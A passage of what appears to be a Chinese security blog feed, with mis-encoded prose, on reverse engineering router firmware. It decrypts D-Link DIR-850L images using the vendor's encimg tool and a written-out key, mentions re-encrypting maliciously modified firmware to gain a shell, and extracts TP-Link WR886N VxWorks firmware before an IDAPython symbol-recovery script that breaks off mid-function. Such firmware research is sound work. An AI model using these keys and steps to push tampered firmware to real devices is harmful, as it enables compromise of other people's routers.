class="line">1704084       0x1A0094        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8231815 bytes, 2677 inodes, blocksize: 131072 bytes, created: 2016-03-29 04:08:14</span><br></pre></td></tr></table></figure><p>å¯¹DIR850LB1_FW207WWb05.binæµ‹è¯•æˆåŠŸï¼Œå†æµ‹è¯•FW220</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> ä¸¤ä¸ªkeyæˆ‘éƒ½å·²ç»å°è¯•</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./revbdec DIR850LB1_FW220WWb03.bin wrgac05_dlob.hans_dir850l &gt; DIR850LB1_FW220WWb03.decrypted</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> binwalk DIR850LB1_FW220WWb03.decrypted </span></span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>å¤±è´¥ï¼Œå¯èƒ½æ˜¯ç”±äºå›ºä»¶çš„åŠ å¯†æ–¹å¼å·²æ”¹å˜</p><p>å›ºä»¶ä¸€èˆ¬æœ‰è¿™ä¹ˆå‡ ç§åŠ å¯†æ–¹å¼ï¼š</p><ol><li>è®¾å¤‡å›ºä»¶å‡ºå‚æ—¶æœªåŠ å¯†ï¼Œä¹Ÿä¸åŒ…å«ä»»ä½•è§£å¯†ä¾‹ç¨‹ã€‚è§£å¯†ä¾‹ç¨‹ä¸å›ºä»¶çš„æœªåŠ å¯†ç‰ˆæœ¬ä¸€èµ·ä»¥æ›´é«˜ç‰ˆæœ¬ï¼ˆv1.1ï¼‰ä¸€èµ·æä¾›ï¼Œä»¥ç”¨äºå°†æ¥çš„åŠ å¯†å›ºä»¶æ›´æ–°ï¼Œéšåçš„å›ºä»¶ç‰ˆæœ¬å°†è¢«åŠ å¯†ã€‚</li></ol><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/encrypt1.jpg" alt="1"></p><ol start="2"><li>è®¾å¤‡å›ºä»¶åœ¨åŸå§‹å‘è¡Œç‰ˆä¸­å·²åŠ å¯†ï¼Œä¾›åº”å•†å†³å®šæ›´æ”¹åŠ å¯†æ–¹æ¡ˆï¼Œå¹¶å‘å¸ƒåŒ…å«æ–°è§£å¯†ä¾‹ç¨‹çš„æœªåŠ å¯†è¿‡æ¸¡ç‰ˆæœ¬v1.2ã€‚é˜…è¯»å›ºä»¶ç‰ˆæœ¬çš„<em>å‘è¡Œè¯´æ˜</em>å¯èƒ½æœ‰åŠ©äºè¯†åˆ«æœªåŠ å¯†çš„è¿‡æ¸¡ç‰ˆæœ¬ã€‚å‘è¡Œè¯´æ˜é€šå¸¸ä¼šæŒ‡å¯¼ç”¨æˆ·åœ¨å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬ä¹‹å‰å…ˆå‡çº§åˆ°ä¸­é—´ç‰ˆæœ¬ï¼Œä¸­é—´ç‰ˆæœ¬å¾ˆå¯èƒ½æ˜¯æœªåŠ å¯†çš„è¿‡æ¸¡å›ºä»¶ã€‚</li></ol><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/encrypt2.jpg" alt></p><ol start="3"><li>è®¾å¤‡å›ºä»¶åœ¨åŸå§‹ç‰ˆæœ¬ä¸­æ˜¯åŠ å¯†çš„ã€‚ä½†æ˜¯ï¼Œä¾›åº”å•†å†³å®šæ›´æ”¹åŠ å¯†æ–¹æ¡ˆï¼Œå¹¶å‘å¸ƒåŒ…å«æ–°è§£å¯†ä¾‹ç¨‹çš„æœªåŠ å¯†è¿‡æ¸¡ç‰ˆæœ¬ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ¥è·å¾—è§£å¯†ä¾‹ç¨‹å°±å¾ˆå›°éš¾äº†ã€‚ä¸€ç§æ–¹æ³•æ˜¯è´­ä¹°è®¾å¤‡å¹¶ç›´æ¥ä»ç¡¬ä»¶ä¸­æå–æœªåŠ å¯†çš„å›ºä»¶ã€‚å¦ä¸€ç§å¯èƒ½çš„æ–¹æ³•æ˜¯å¯¹å›ºä»¶è¿›è¡Œæ›´å¤šçš„åˆ†æï¼Œä»¥æœŸâ€œç ´è§£åŠ å¯†â€ã€‚</li></ol><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/encrypt3.jpg" alt></p><h1 id="è§£å¯†new-version"><a href="#è§£å¯†new-version" class="headerlink" title="è§£å¯†new version"></a>è§£å¯†new version</h1><p>é€šè¿‡åˆ†æDIR850L B1ç³»åˆ—çš„è·¯ç”±å™¨ï¼Œå‘ç°DIR850LB1_FW210WWb03.binæ²¡æœ‰è¢«åŠ å¯†ï¼Œæ‰€ä»¥åº”è¯¥å°±æ˜¯ä¸Šè¿°çš„åŠ å¯†æ–¹å¼2ï¼Œæ–°çš„è§£å¯†æ–¹å¼åº”è¯¥å°±ä¿å­˜åœ¨FW210ä¸­</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> binwalk DIR850LB1_FW210WWb03.bin </span></span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             DLOB firmware header, boot partition: "dev=/dev/mtdblock/1"</span><br><span class="line">10380         0x288C          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes</span><br><span class="line">209586        0x332B2         Nagra Constant_KEY IDEA_Key: 10192431 B9CB4D0F BA90B26E</span><br><span class="line">1704052       0x1A0074        PackImg section delimiter tag, little endian size: 13664256 bytes; big endian size: 8441856 bytes</span><br><span class="line">1704084       0x1A0094        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8441157 bytes, 2692 inodes, blocksize: 131072 bytes, created: 2017-09-18 12:11:33</span><br></pre></td></tr></table></figure><p>åœ¨idaä¸­æŸ¥æ‰¾åŠ å¯†å…³é”®å­—<code>crypt</code>å‘ç°äº†å…³é”®å‡½æ•°<code>encrypt_main</code>-&gt;<code>sub_4090E0</code></p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/dir850l_stringencry.png" alt="crypt"></p><p>è¿˜å¯ä»¥æ³¨æ„åˆ°ï¼Œåœ¨<code>encrypt_main</code>è°ƒç”¨çš„<code>sub_408F8C</code>ä¸­ï¼Œä¼¼ä¹æ˜¯å¯¹æ–‡ä»¶è¿›è¡Œencode decodeå¤„ç†çš„å‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/dir805lencimg.png" alt></p><p>è€Œåœ¨æˆ‘ä»¬çš„å›ºä»¶ç³»ç»Ÿæ–‡ä»¶ä¸­å­˜åœ¨<code>/usr/sbin/encimg</code>ï¼Œå°è¯•è¿è¡Œä¸€ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo chroot . ./qemu-mips-static usr/sbin/encimg</span></span><br><span class="line">no signature specified!</span><br><span class="line">Usage: encimg &#123;OPTIONS&#125;</span><br><span class="line">   -h                      : show this message.</span><br><span class="line">   -v                      : Verbose mode.</span><br><span class="line">   -i &#123;input image file&#125;   : input image file.</span><br><span class="line">   -e                      : encode file.</span><br><span class="line">   -d                      : decode file.</span><br><span class="line">   -s                      : signature.</span><br><span class="line"><span class="meta">#</span><span class="bash"> inputæ–‡ä»¶ä½¿ç”¨ç»å¯¹è·¯å¾„ç›¸å¯¹è·¯å¾„éƒ½æ‰¾ä¸åˆ°æ–‡ä»¶ï¼Œæœ€åè¿˜æ˜¯æŠŠæ–‡ä»¶è´´åˆ°äº†squashfs-rootæ ¹ç›®å½•ä¸‹</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chroot . ./qemu-mips-static --strace usr/sbin/encimg -i DIR850LB1_FW220WWb03.bin -d -s wrgac25_dlink.2013gui_dir850l </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> è§£å¯†æˆåŠŸï¼</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> binwalk DIR850LB1_FW220WWb03.bin </span></span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             DLOB firmware header, boot partition: "dev=/dev/mtdblock/1"</span><br><span class="line">10380         0x288C          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes</span><br><span class="line">209586        0x332B2         Nagra Constant_KEY IDEA_Key: 10192431 B9CB4D0F BA90B26E</span><br><span class="line">1704052       0x1A0074        PackImg section delimiter tag, little endian size: 13664256 bytes; big endian size: 8441856 bytes</span><br><span class="line">1704084       0x1A0094        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8441027 bytes, 2692 inodes, blocksize: 131072 bytes, created: 2017-09-18 12:21:21</span><br></pre></td></tr></table></figure><h1 id="æ¶æ„æ›´æ–°å›ºä»¶"><a href="#æ¶æ„æ›´æ–°å›ºä»¶" class="headerlink" title="æ¶æ„æ›´æ–°å›ºä»¶"></a>æ¶æ„æ›´æ–°å›ºä»¶</h1><p>å¯¹å›ºä»¶æ¶æ„ä¿®æ”¹åè¿›è¡Œæ‰“åŒ…å†åŠ å¯†ï¼Œå‡çº§åè·å–shell</p><h1 id="IOT-Auditor"><a href="#IOT-Auditor" class="headerlink" title="IOT Auditor"></a><a href="https://app.expliot.io/" target="_blank" rel="noopener">IOT Auditor</a></h1><ol><li><p>ç†µå›¾å¯¹æ¯”</p></li><li><p>åˆ†æLinuxæ–‡ä»¶ç³»ç»Ÿå¹¶ä¸‹è½½æ‰€æœ‰å†…å®¹</p></li><li><p>åç¼–è¯‘çš„ä»£ç å’Œå‡½æ•°</p></li><li><p><a href="https://expliot.io/pages/firmware-auditor" target="_blank" rel="noopener">https://expliot.io/pages/firmware-auditor</a></p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/dir850l_iotauditor.png" alt></p><blockquote><p>reference:</p><p><a href="https://cq674350529.github.io/2019/03/18/D-Link-DIR-850L%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%86%E6%9E%90%E4%B9%8B%E8%8E%B7%E5%8F%96%E8%AE%BE%E5%A4%87shell/" target="_blank" rel="noopener">https://cq674350529.github.io/2019/03/18/D-Link-DIR-850L%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%86%E6%9E%90%E4%B9%8B%E8%8E%B7%E5%8F%96%E8%AE%BE%E5%A4%87shell/</a></p><p><a href="https://mp.weixin.qq.com/s/CpT4gTAwYMCFqwTRxQBBkw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/CpT4gTAwYMCFqwTRxQBBkw</a></p><p><a href="https://www.4hou.com/posts/wZpJ" target="_blank" rel="noopener">https://www.4hou.com/posts/wZpJ</a></p></blockquote><h1 id="åç»­"><a href="#åç»­" class="headerlink" title="åç»­"></a>åç»­</h1><p>DIR-850Lçš„æœ€æ–°å›ºä»¶<code>DIR850LB1_FW223WWb01</code>ä¹Ÿæ˜¯è¢«åŠ å¯†çš„ï¼Œè€Œè§£å¯†è¿›ç¨‹å°±åœ¨FW220ä¸­ï¼Œä½¿ç”¨ä¸Šè¿°æ–¹æ³•å³å¯è§£å¯†å›ºä»¶^_^</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å›ºä»¶ä¸‹è½½åœ°å€ï¼š&lt;a href=&quot;http://files.dlink.com.au/Products/DIR-850L/REV_B/Firmware/Firmware_v2.20b03/DIR850LB1_FW220WWb03.bin&quot; target=&quot;_blank&quot; re</summary>
      
    
    
    
    <category term="ç¬”è®°" scheme="p1Kk.github.io/categories/ç¬”è®°/"/>
    
    
    <category term="iot" scheme="p1Kk.github.io/tags/iot/"/>
    
  </entry>
  
  <entry>
    <title>TP-Link WR886N v6 å‡çº§åŒ…å›ºä»¶åˆ†æï¼ˆVxWorks æ¢å¤ç¬¦å·è¡¨ï¼‰</title>
    <link href="p1Kk.github.io/2021/06/12/iot/tplink%20wr886%20v6/"/>
    <id>p1Kk.github.io/2021/06/12/iot/tplink%20wr886%20v6/</id>
    <published>2021-06-11T16:00:00.000Z</published>
    <updated>2021-06-17T08:04:22.210Z</updated>
    
    <content type="html"><![CDATA[<p>downloadï¼š<a href="https://service.tp-link.com.cn/detail_download_8676.html" target="_blank" rel="noopener">https://service.tp-link.com.cn/detail_download_8676.html</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk TL-WR886N\ V6.0_2.3.8\ Build\ 190826\ Rel.54648n.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">12656         0x3170          U-Boot version string, &quot;U-Boot 1.1.4 (May  8 2016 - 07:42:47)&quot;</span><br><span class="line">12704         0x31A0          CRC32 polynomial table, big endian</span><br><span class="line">13932         0x366C          uImage header, header size: 64 bytes, header CRC: 0x773178DD, created: 2016-05-08 14:42:48, image size: 20788 bytes, Data Address: 0x80010000, Entry Point: 0x80010000, data CRC: 0x983BDABA, OS: Linux, CPU: MIPS, image type: Firmware Image, compression type: lzma, image name: &quot;u-boot image&quot;</span><br><span class="line">13996         0x36AC          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 52148 bytes</span><br><span class="line">41472         0xA200          LZMA compressed data, properties: 0x6E, dictionary size: 8388608 bytes, uncompressed size: 2372176 bytes   ğŸ“Œ</span><br><span class="line">791104        0xC1240         LZMA compressed data, properties: 0x5A, dictionary size: 8388608 bytes, uncompressed size: 1731 bytes</span><br><span class="line">792301        0xC16ED         LZMA compressed data, properties: 0x5A, dictionary size: 8388608 bytes, uncompressed size: 7272 bytes</span><br><span class="line">793897        0xC1D29         LZMA compressed data, properties: 0x5A, dictionary size: 8388608 bytes, uncompressed size: 200 bytes</span><br><span class="line">794124        0xC1E0C         LZMA compressed data, properties: 0x5A, dictionary size: 8388608 bytes, uncompressed size: 247 bytes</span><br><span class="line">...</span><br><span class="line"># å¯ä»¥ä½¿ç”¨binwalkç›´æ¥è·å–ï¼Œè§£å‹åçš„æ–‡ä»¶A200å°±æ˜¯æˆ‘ä»¬ä¸‹é¢æƒ³è¦ä¸€æ­¥æ­¥æå–çš„ç³»ç»Ÿæ–‡ä»¶</span><br><span class="line">$ binwalk -Me TL-WR886N\ V6.0_2.3.8\ Build\ 190826\ Rel.54648n.bin</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰U-Bootï¼ŒCRC32ï¼ŒuImage headerï¼Œåœ¨0xA200å¤„æœ‰ä¸€ä¸ª2Må¤šçš„lzmaå‹ç¼©åŒ…</p><h1 id="æå–"><a href="#æå–" class="headerlink" title="æå–"></a>æå–</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> ddæå–uImageé•œåƒ skip = uImage header<span class="string">'s start_addr | count = image size+header size</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> dd <span class="keyword">if</span>=TL-WR886N\ V6.0_2.3.8\ Build\ 190826\ Rel.54648n.bin of=uboot.img bs=1 skip=13932 count=749632</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> binwalk uboot.img </span></span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             uImage header, header size: 64 bytes, header CRC: 0x773178DD, created: 2016-05-08 14:42:48, image size: 20788 bytes, Data Address: 0x80010000, Entry Point: 0x80010000, data CRC: 0x983BDABA, OS: Linux, CPU: MIPS, image type: Firmware Image, compression type: lzma, image name: "u-boot image"</span><br><span class="line">64            0x40            LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 52148 bytes</span><br><span class="line">27540         0x6B94          LZMA compressed data, properties: 0x6E, dictionary size: 8388608 bytes, uncompressed size: 2372176 bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> ddè§£å‹é•œåƒlzmaæ•°æ®</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> dd <span class="keyword">if</span>=uboot.img of=uboot.lzma bs=1 skip=64 </span></span><br><span class="line">ï¼Ÿï¼Ÿï¼Ÿ</span><br><span class="line">æš‚ä¸åˆ†æ</span><br></pre></td></tr></table></figure><p>å¯¹äº2Må¤§å°çš„lzmaå‹ç¼©åŒ…ï¼Œå¯èƒ½ä¼šæœ‰æˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ï¼Œæå–å‡ºæ¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> skip = start_addr | count = next_start_addr - start_addr = 791104-41472</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> dd <span class="keyword">if</span>=TL-WR886N\ V6.0_2.3.8\ Build\ 190826\ Rel.54648n.bin of=A200.lzma bs=1 skip=41472 count=749632  </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> è§£å‹</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> lzma -d A200.lzma </span></span><br><span class="line">lzma: A200.lzma: Compressed data is corrupt</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨winhexæŸ¥çœ‹binæ–‡ä»¶</p><p>åœ¨0xA200çš„ç»“å°¾0xC1240ä¸Šä¸‹éƒ½æœ‰æ•°æ®å­˜åœ¨ï¼Œè€Œä¸Šæ–¹çš„FF FFæ›´åƒæ˜¯æ–‡ä»¶ç»“æŸçš„ä½ç½®</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/tlwr886hex1.png" alt></p><p>å†çœ‹åˆ°0xA200å¤„ï¼Œå‰é¢éƒ½æ˜¯00 00ï¼Œå¾ˆæ˜æ˜¾çš„ç»“æŸ</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/tlwr886hex2.png" alt></p><p>æ‰€ä»¥æ‰¾åˆ°0xA200çœŸæ­£çš„ç»“æŸä½ç½®æ˜¯åœ¨0xC0F1Aï¼Œå³count = 0xC0F1B - 0xA200 = 748827</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/tlwr886hex3.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> $ dd if=TL-WR886N\ V6.0_2.3.8\ Build\ 190826\ Rel.54648n.bin of=A200.lzma bs=1 skip=41472 count=748827  </span><br><span class="line">$ lzma -d A200.lzma</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹è§£å‹åçš„æ–‡ä»¶A200ï¼Œåº”è¯¥å°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„ç³»ç»Ÿæ–‡ä»¶</span><br><span class="line">$ binwalk A200 </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">1851668       0x1C4114        Certificate in DER format (x509 v3), header length: 4, sequence length: 4</span><br><span class="line">1858956       0x1C5D8C        Certificate in DER format (x509 v3), header length: 4, sequence length: 4</span><br><span class="line">1904512       0x1D0F80        VxWorks operating system version &quot;5.5.1&quot; , compiled: &quot;Aug 26 2019, 15:10:48&quot;</span><br><span class="line">1973916       0x1E1E9C        Copyright string: &quot;Copyright(C) 2001-2011 by TP-LINK TECHNOLOGIES CO., LTD.&quot;</span><br><span class="line">2003596       0x1E928C        VxWorks WIND kernel version &quot;2.6&quot;</span><br><span class="line">2048864       0x1F4360        HTML document header</span><br><span class="line">2048929       0x1F43A1        HTML document footer</span><br><span class="line">2069052       0x1F923C        PEM certificate</span><br><span class="line">2069108       0x1F9274        PEM RSA private key</span><br><span class="line">2078560       0x1FB760        Base64 standard index table</span><br><span class="line">2087437       0x1FDA0D        StuffIt Deluxe Segment (data): f</span><br><span class="line">2113876       0x204154        CRC32 polynomial table, big endian</span><br><span class="line">2114900       0x204554        CRC32 polynomial table, big endian</span><br><span class="line">2115924       0x204954        CRC32 polynomial table, big endian</span><br><span class="line">2116948       0x204D54        CRC32 polynomial table, big endian</span><br><span class="line">2137292       0x209CCC        XML document, version: &quot;1.0&quot;</span><br><span class="line">2156884       0x20E954        SHA256 hash constants, big endian</span><br><span class="line">2254945       0x226861        StuffIt Deluxe Segment (data): f</span><br><span class="line">2254976       0x226880        StuffIt Deluxe Segment (data): fError</span><br></pre></td></tr></table></figure><h1 id="æ¢å¤ç¬¦å·è¡¨"><a href="#æ¢å¤ç¬¦å·è¡¨" class="headerlink" title="æ¢å¤ç¬¦å·è¡¨"></a>æ¢å¤ç¬¦å·è¡¨</h1><p>å¯¼å…¥idaè¿›è¡Œåˆ†æï¼ˆè®¾ç½®ä¸ºMIPS big endianï¼‰ï¼Œå’Œ<a href="https://p1kk.github.io/2021/06/11/iot/%E6%96%BD%E8%80%90%E5%BE%B7%20NOE771/" target="_blank" rel="noopener">ä¸Šæ¬¡</a>é‡åˆ°çš„æƒ…å†µä¸€æ ·ï¼Œè¿˜æ˜¯ä»€ä¹ˆéƒ½åˆ†æä¸å‡ºæ¥ã€‚éœ€è¦ç¡®å®šåŠ è½½åŸºå€ã€‚</p><p>å‰é¢åœ¨ä½¿ç”¨binwalkæŸ¥çœ‹binæ–‡ä»¶æ—¶ï¼Œåœ¨uboot imgae headerä¸­æœ‰<code>Data Address: 0x80010000, Entry Point: 0x80010000</code>ï¼Œä½†æ˜¯è¿™åº”è¯¥åªæ˜¯ubootçš„åŠ è½½åŸºå€ã€‚</p><p>åœ¨0xa200å‰ä¹Ÿå‘ç°äº†ç–‘ä¼¼headeræ•°æ®æ®µæŒ‡å‘äº†0x80001000ï¼Œè€Œè¿™ä¸ªåœ°å€ä¹Ÿæ­£æ˜¯è®¸å¤šå›ºä»¶æ–‡ä»¶çš„åŠ è½½åœ°å€ã€‚å°è¯•ä½¿ç”¨è¯¥åœ°å€ä½œä¸ºåŠ è½½åœ°å€</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/tlwr886hex4.png" alt></p><p>ä¾æ—§è¿˜æ˜¯ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œä¸è¿‡é€šè¿‡åœ¨ä¸€äº›åœ°å€æŒ‰â€Câ€ï¼Œå¯ä»¥è‡ªåŠ¨åˆ†æå‡ºå‡½æ•°ï¼Œæœ€ç»ˆè§£æå‡ºäº†ä¸¤åƒå¤šä¸ªå‡½æ•°ï¼Œä¾æ—§æ²¡æœ‰ç¬¦å·è¡¨ä¿¡æ¯ï¼Œä¸”é€šè¿‡åˆ†æè¯¥æ–‡ä»¶ï¼Œå¹¶æ²¡æœ‰æ‰¾åˆ°ç¬¦å·è¡¨ç›¸å…³ã€‚åœ¨é€šè¿‡binwalkè§£å‹å‡ºçš„æ–‡ä»¶ä¸­æŸ¥æ‰¾<code>bzero</code>å‡½æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ grep -r bzero ./</span><br><span class="line">Binary file ./C2E58 matches</span><br><span class="line"></span><br><span class="line"># _TL-WR886N V6.0_2.3.8 Build 190826 Rel.54648n.bin.extractedä¸­åªæœ‰ä¸‰ä¸ªbinaryæ–‡ä»¶</span><br><span class="line">36AC ubootæ–‡ä»¶</span><br><span class="line">A200 å›ºä»¶ç³»ç»Ÿ</span><br><span class="line">C2E58 ç¬¦å·æ–‡ä»¶</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹C2E58æ–‡ä»¶ï¼Œå¯ä»¥æ‰¾å‡ºç¬¦å·ç´¢å¼•çš„è§„å¾‹ï¼ŒåŒæ—¶ç¬¦å·è¡¨ä¸­çš„ç¬¦å·ä¹‹é—´ç”¨\x00åˆ†éš”</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/tlwr886hex5.png" alt></p><p>åˆ©ç”¨idapythonä¿®å¤ç¬¦å·è¡¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"></span><br><span class="line">symfile_path = <span class="string">'C:\\C2E58'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¬¦å·èµ·å§‹</span></span><br><span class="line">symbols_table_start = <span class="number">8</span></span><br><span class="line"><span class="comment"># å­—ç¬¦ä¸²èµ·å§‹</span></span><br><span class="line">strings_table_start = <span class="number">0x9d80</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(symfile_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    symfile_contents = f.read()</span><br><span class="line"></span><br><span class="line">symbols_table = symfile_contents[symbols_table_start:strings_table_start]</span><br><span class="line">strings_table = symfile_contents[strings_table_start:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_strings_by_offset</span><span class="params">(offset)</span>:</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> strings_table[offset+index] != <span class="number">0</span>:</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> strings_table[offset:offset+index]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_symbols_metadata</span><span class="params">()</span>:</span></span><br><span class="line">  